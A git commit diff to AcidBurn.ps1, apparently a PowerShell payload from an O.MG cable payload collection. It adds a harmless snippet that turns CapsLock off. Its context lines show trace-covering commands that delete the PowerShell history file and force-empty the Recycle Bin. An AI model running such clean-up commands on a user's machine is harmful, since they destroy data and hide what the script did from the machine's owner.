13ebbfa1c980cbe8a14bb8c3b9b7501345e9d017
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-05-04 23:39:46 -0500

    Update AcidBurn.ps1

--- OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1
+++ OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1
@@ -689,6 +689,16 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-###########################################################################################################
+#----------------------------------------------------------------------------------------------------
 
-###########################################################################################################
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
